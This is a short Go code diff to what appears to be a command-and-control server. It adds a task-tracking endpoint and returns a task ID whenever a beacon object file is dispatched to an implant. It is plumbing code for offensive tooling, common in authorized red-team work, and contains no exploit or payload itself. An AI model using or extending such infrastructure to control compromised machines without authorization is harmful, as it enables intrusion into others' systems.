@@ -13,6 +13,7 @@ func mountAPI(mux *http.ServeMux) {
 	mux.HandleFunc("/api/implants/", implantHandler)
 	mux.HandleFunc("/api/bofs", bofsHandler)
 	mux.HandleFunc("/api/bofs/", bofRunHandler)
+	mux.HandleFunc("/api/tasks/", taskHandler)
 	mux.HandleFunc("/ws", handleWS)
 }
 
@@ -75,11 +76,14 @@ func implantHandler(w http.ResponseWriter, r *http.Request) {
 			http.Error(w, err.Error(), http.StatusBadRequest)
 			return
 		}
+		// Register a task BEFORE sending so a lightning-fast implant reply
+		// can't arrive before the task exists.
+		taskID := tasks.Create(id)
 		if err := s.Send(serverMsg{Type: "bof", File: fileB64, Args: body.Args}); err != nil {
 			http.Error(w, err.Error(), http.StatusInternalServerError)
 			return
 		}
-		writeJSON(w, http.StatusOK, map[string]string{"status": "sent"})
+		writeJSON(w, http.StatusOK, map[string]string{"task_id": taskID, "status": "sent"})
 	default:
 		http.Error(w, "unsupported", http.StatusMethodNotAllowed)
 	}
